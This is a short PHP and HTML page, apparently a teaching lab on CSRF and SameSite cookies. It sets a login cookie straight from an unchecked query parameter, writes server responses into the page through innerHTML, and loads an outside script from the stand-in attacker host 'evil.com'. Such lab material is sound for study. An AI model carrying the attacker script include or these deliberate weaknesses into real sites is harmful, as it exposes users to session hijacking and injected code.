<?php 
$name=$_GET["name"];

// Simulating a login cookie, assuming user has logged in to set this cookie 
setcookie("login", $name, [
    'expires' => time() + 86400,
    'path' => '/',
    'domain' => 'host.com',
    'secure' => false,
    'httponly' => true,
    'samesite' => 'Strict',
]);

?>
<html>
    <head>
        <title>CSRF</title>
    </head>
    <body>
        <script>
        var xmlhttp = new XMLHttpRequest();
        var url =  "http://host.com:8080/tp5/ressources/simple.php";
        var callback = function () {
            document.getElementById("answerdiv").innerHTML=this.responseText;
        }
        var call = function () {
            xmlhttp.open('GET',url, true);
            xmlhttp.onreadystatechange = callback;
            xmlhttp.send(null);
        }
        </script>
        <font size="5">
        This page was generated by the Server  
        <button onclick= "call()"> Call the Server </button> 
        </font>
        <div id= answerdiv> Waiting for an answer...</div>
        <script src="http://evil.com:8080/tp5/mycode/attackerGadget.js"></script>
    </body>
</html>